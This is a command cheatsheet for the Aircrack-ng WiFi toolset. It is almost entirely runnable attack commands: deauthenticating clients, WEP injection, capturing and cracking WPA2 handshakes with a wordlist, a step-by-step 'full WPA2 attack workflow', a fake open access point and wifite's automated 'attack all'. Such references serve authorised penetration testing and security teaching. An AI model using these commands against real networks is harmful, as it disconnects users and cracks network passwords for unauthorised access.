# Aircrack-ng Cheatsheet

> Quick reference for WiFi security auditing with Aircrack-ng suite.

```bash
# ──────────────────────────────────────────────
# SETUP MONITOR MODE
# ──────────────────────────────────────────────
iwconfig                          # List wireless interfaces
sudo airmon-ng check kill         # Kill interfering processes
sudo airmon-ng start wlan0        # Enable monitor mode → wlan0mon
sudo airmon-ng stop wlan0mon      # Disable monitor mode

# ──────────────────────────────────────────────
# AIRODUMP-NG — SCAN / CAPTURE
# ──────────────────────────────────────────────

# Scan all networks
sudo airodump-ng wlan0mon

# Target specific AP (note BSSID and channel first)
sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon

# Output columns:
# BSSID = AP MAC | PWR = signal | CH = channel
# ENC = encryption | ESSID = network name
# STATION = connected clients

# ──────────────────────────────────────────────
# AIREPLAY-NG — INJECT TRAFFIC
# ──────────────────────────────────────────────

# Deauthentication attack (force handshake capture)
sudo aireplay-ng --deauth 10 -a <AP_BSSID> wlan0mon             # All clients
sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT> wlan0mon  # Specific client

# Fake authentication (for WEP)
sudo aireplay-ng -1 0 -a <BSSID> wlan0mon

# ARP replay (generate IVs for WEP)
sudo aireplay-ng -3 -b <BSSID> wlan0mon

# ──────────────────────────────────────────────
# AIRCRACK-NG — CRACK
# ──────────────────────────────────────────────

# Crack WPA2 with captured handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Crack WEP (needs ~50k IVs)
aircrack-ng capture-01.cap

# Crack WPA2 with hashcat (convert first)
cap2hccapx capture-01.cap capture.hccapx
hashcat -a 0 -m 22000 capture.hccapx rockyou.txt

# ──────────────────────────────────────────────
# FULL WPA2 ATTACK WORKFLOW
# ──────────────────────────────────────────────
# 1. Kill interfering processes
sudo airmon-ng check kill

# 2. Enable monitor mode
sudo airmon-ng start wlan0

# 3. Scan for networks
sudo airodump-ng wlan0mon

# 4. Target network (replace with real values)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# 5. In another terminal — deauth a client
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 6. Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump header

# 7. Crack
aircrack-ng wpa_capture-01.cap -w /usr/share/wordlists/rockyou.txt

# ──────────────────────────────────────────────
# AIRBASE-NG — FAKE ACCESS POINT
# ──────────────────────────────────────────────
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# ──────────────────────────────────────────────
# WIFITE — AUTOMATED
# ──────────────────────────────────────────────
sudo wifite                              # Auto attack all
sudo wifite --wpa --dict rockyou.txt    # WPA only with wordlist
```
